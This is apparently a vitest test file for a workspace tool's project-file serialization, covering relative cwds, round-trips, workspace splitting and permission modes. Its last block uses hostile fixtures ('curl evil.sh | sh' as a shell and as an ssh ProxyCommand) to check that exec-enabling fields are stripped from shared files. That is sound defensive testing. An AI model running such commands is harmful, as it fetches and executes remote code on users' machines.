import { describe, it, expect } from 'vitest'
import type { CanvasNodeState, Project, Workspace } from '../shared/types'
import {
  toPortableNodes, resolveNodes, projectToFile, fileToProject,
  sameProjectContent, splitWorkspace, serializeProjectFile
} from './workspace-files'

const node = (over: Partial<CanvasNodeState> = {}): CanvasNodeState => ({
  id: 'term-abc', kind: 'terminal', position: { x: 0, y: 0 },
  size: { width: 400, height: 300 }, title: 't', color: '#fff', group: null, ...over
})
const project = (over: Partial<Project> = {}): Project => ({
  id: 'p1', name: 'foo', color: '#7aa2f7', viewport: { x: 0, y: 0, zoom: 1 },
  nodes: [node()], ...over
})

describe('portable node cwds', () => {
  it('relativizes cwds under the root with a ./ prefix and resolves them back', () => {
    const nodes = [node({ cwd: '/Users/enes/projects/foo/sub' })]
    const portable = toPortableNodes(nodes, '/Users/enes/projects/foo')
    expect(portable[0].cwd).toBe('./sub')
    expect(resolveNodes(portable, '/mnt/other/foo')[0].cwd).toBe('/mnt/other/foo/sub')
  })
  it('the root itself becomes "." ', () => {
    const portable = toPortableNodes([node({ cwd: '/a/b' })], '/a/b')
    expect(portable[0].cwd).toBe('.')
    expect(resolveNodes(portable, '/x')[0].cwd).toBe('/x')
  })
  it('paths outside the root stay absolute, cwd-less nodes untouched', () => {
    const portable = toPortableNodes([node({ cwd: '/elsewhere' }), node({ id: 'n2' })], '/a/b')
    expect(portable[0].cwd).toBe('/elsewhere')
    expect(portable[1].cwd).toBeUndefined()
    expect(resolveNodes(portable, '/a/b')[0].cwd).toBe('/elsewhere')
  })
})

describe('projectToFile / fileToProject round-trip', () => {
  it('drops cwd/closed/unavailable, keeps nodes/session state, restores from base', () => {
    const p = project({
      cwd: '/a/b', closed: true, defaultAccountId: 'acct1', dinoHighScore: 7,
      nodes: [node({ cwd: '/a/b/x', agentId: 'claude', accountId: 'acct1' })],
      bridges: [{ id: 'e1', source: 's', target: 't' }]
    })
    const f = projectToFile(p, 3, '2026-07-11T00:00:00.000Z')
    expect(f.version).toBe(1); expect(f.rev).toBe(3)
    expect((f as any).cwd).toBeUndefined(); expect((f as any).closed).toBeUndefined()
    expect(f.nodes[0].cwd).toBe('./x')
    const back = fileToProject(f, { cwd: '/new/root', closed: true })
    expect(back).toMatchObject({ id: 'p1', cwd: '/new/root', closed: true, defaultAccountId: 'acct1', dinoHighScore: 7 })
    expect(back.nodes[0]).toMatchObject({ cwd: '/new/root/x', agentId: 'claude', accountId: 'acct1' })
    expect(back.unavailable).toBeUndefined()
  })
})

describe('sameProjectContent', () => {
  it('ignores rev and savedAt, sees node changes', () => {
    const a = projectToFile(project(), 1, '2026-01-01T00:00:00.000Z')
    const b = projectToFile(project(), 9, '2026-02-02T00:00:00.000Z')
    expect(sameProjectContent(a, b)).toBe(true)
    const c = projectToFile(project({ nodes: [node({ title: 'renamed' })] }), 1, a.savedAt)
    expect(sameProjectContent(a, c)).toBe(false)
  })
})

describe('splitWorkspace', () => {
  const ws: Workspace = {
    version: 2, activeProjectId: 'p1',
    projects: [
      project({ id: 'p1', cwd: '/a/foo' }),
      project({ id: 'p2', name: 'canvas-only' }),
      project({ id: 'p3', ssh: { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' } })
    ]
  }
  it('local-cwd → ref entry + file; cwd-less → inline; ssh → ssh entry + cache', () => {
    const { index, files } = splitWorkspace(ws, () => 1, '2026-07-11T00:00:00.000Z')
    expect(index.version).toBe(3)
    expect(index.activeProjectId).toBe('p1')
    expect(index.entries[0]).toMatchObject({ id: 'p1', name: 'foo', cwd: '/a/foo' })
    expect(index.entries[0].project).toBeUndefined()
    expect(files.get('/a/foo')!.id).toBe('p1')
    expect(index.entries[1].project!.id).toBe('p2')
    expect(index.entries[2].ssh!.remoteCwd).toBe('~/app')
    expect(index.entries[2].cache!.id).toBe('p3')
    expect(files.has('~/app')).toBe(false) // ssh files are not local writes
  })
  it('two projects on the same cwd → one file + one inline entry (no last-wins clobber)', () => {
    const shared: Workspace = {
      version: 2, activeProjectId: 'a',
      projects: [
        project({ id: 'a', name: 'first', cwd: '/a/foo' }),
        project({ id: 'b', name: 'second', cwd: '/a/foo' })
      ]
    }
    const { index, files } = splitWorkspace(shared, () => 1, '2026-07-11T00:00:00.000Z')
    expect(files.size).toBe(1) // only the first claims the file
    expect(files.get('/a/foo')!.id).toBe('a')
    expect(index.entries[0]).toMatchObject({ id: 'a', cwd: '/a/foo' })
    expect(index.entries[0].project).toBeUndefined()
    // The second is kept verbatim inline — no file, nothing lost.
    expect(index.entries[1].cwd).toBeUndefined()
    expect(index.entries[1].project).toMatchObject({ id: 'b', name: 'second', cwd: '/a/foo' })
    expect(index.entries[1].project!.unavailable).toBeUndefined()
  })

  it('never persists the runtime unavailable flag inline', () => {
    const { index } = splitWorkspace(
      { version: 2, activeProjectId: 'x', projects: [project({ id: 'x', unavailable: true })] },
      () => 1, '2026-07-11T00:00:00.000Z')
    expect(index.entries[0].project!.unavailable).toBeUndefined()
  })
  it('an unavailable ref is header-only: no file (local cwd) and no cache (ssh)', () => {
    const local = splitWorkspace(
      { version: 2, activeProjectId: 'p1', projects: [project({ id: 'p1', cwd: '/a/foo', unavailable: true })] },
      () => 1, '2026-07-11T00:00:00.000Z')
    expect(local.index.entries[0]).toMatchObject({ id: 'p1', name: 'foo', cwd: '/a/foo' })
    expect(local.files.has('/a/foo')).toBe(false) // no placeholder file written over real data
    const remote = splitWorkspace(
      { version: 2, activeProjectId: 'p1', projects: [project({ id: 'p1', ssh: { server: { host: 'h', user: 'u' } as any, remoteCwd: '~/app' }, unavailable: true })] },
      () => 1, '2026-07-11T00:00:00.000Z')
    expect(remote.index.entries[0]).toMatchObject({ id: 'p1', ssh: { remoteCwd: '~/app' } })
    expect(remote.index.entries[0].cache).toBeUndefined() // no cache fabricated from the placeholder
  })
})

describe('serializeProjectFile', () => {
  it('is pretty-printed with version first (stable git diffs)', () => {
    const s = serializeProjectFile(projectToFile(project(), 1, '2026-07-11T00:00:00.000Z'))
    expect(s.startsWith('{\n  "version": 1,\n  "rev": 1,')).toBe(true)
  })
})

describe('permission mode persistence', () => {
  const base = {
    id: 'p1',
    name: 'proj',
    color: '#fff',
    viewport: { x: 0, y: 0, zoom: 1 },
    nodes: []
  }

  it('round-trips a project permission-mode override', () => {
    const file = projectToFile({ ...base, defaultPermissionMode: 'plan' }, 1, 'now')
    expect(file.defaultPermissionMode).toBe('plan')
    expect(fileToProject(file, {}).defaultPermissionMode).toBe('plan')
  })

  it('omits the key entirely when there is no override', () => {
    const file = projectToFile(base, 1, 'now')
    expect('defaultPermissionMode' in file).toBe(false)
    expect(fileToProject(file, {}).defaultPermissionMode).toBeUndefined()
  })
})

describe('exec-enabling node fields never travel in the shared project file', () => {
  const hostileNodes = [
    node({ id: 'n1', shell: 'curl evil.sh | sh' }),
    node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' } })
  ]

  it('projectToFile strips shell + ssh.extraArgs (a teammate who clones gets no command)', () => {
    const file = projectToFile(project({ cwd: '/a/b', nodes: hostileNodes }), 1, 'now')
    expect(file.nodes[0].shell).toBeUndefined()
    expect(file.nodes[1].ssh?.extraArgs).toBeUndefined()
    expect(serializeProjectFile(file)).not.toContain('ProxyCommand')
    // the connection itself still persists (a node must reattach to its host)
    expect(file.nodes[1].ssh?.host).toBe('h')
  })

  it('fileToProject with no local overlay drops what the FILE claimed (adopted/cloned folder)', () => {
    const f = { ...projectToFile(project({ nodes: [] }), 1, 'now'), nodes: hostileNodes }
    const p = fileToProject(f, { cwd: '/a/b' })
    expect(p.nodes[0].shell).toBeUndefined()
    expect(p.nodes[1].ssh?.extraArgs).toBeUndefined()
  })

  it("fileToProject restores only THIS machine's values (from the local index entry)", () => {
    const f = { ...projectToFile(project({ nodes: [] }), 1, 'now'), nodes: hostileNodes }
    const p = fileToProject(f, { cwd: '/a/b', localExec: { n1: { shell: '/bin/zsh' } } })
    expect(p.nodes[0].shell).toBe('/bin/zsh')
    expect(p.nodes[1].ssh?.extraArgs).toBeUndefined()
  })

  it('splitWorkspace keeps the local values in the machine-local index, not in the file', () => {
    const p = project({
      cwd: '/a/b',
      nodes: [
        node({ id: 'n1', shell: '/bin/zsh' }),
        node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp %h' } })
      ]
    })
    const ws: Workspace = { version: 2, activeProjectId: 'p1', projects: [p] }
    const { index, files } = splitWorkspace(ws, () => 1, 'now')
    expect(index.entries[0].localExec).toEqual({
      n1: { shell: '/bin/zsh' },
      n2: { sshExtraArgs: '-o ProxyCommand=corp %h' }
    })
    const file = files.get('/a/b')!
    expect(file.nodes[0].shell).toBeUndefined()
    expect(file.nodes[1].ssh?.extraArgs).toBeUndefined()
    // and the round trip through the index restores them for the local user
    const back = fileToProject(file, { cwd: '/a/b', localExec: index.entries[0].localExec })
    expect(back.nodes[0].shell).toBe('/bin/zsh')
    expect(back.nodes[1].ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
  })
})
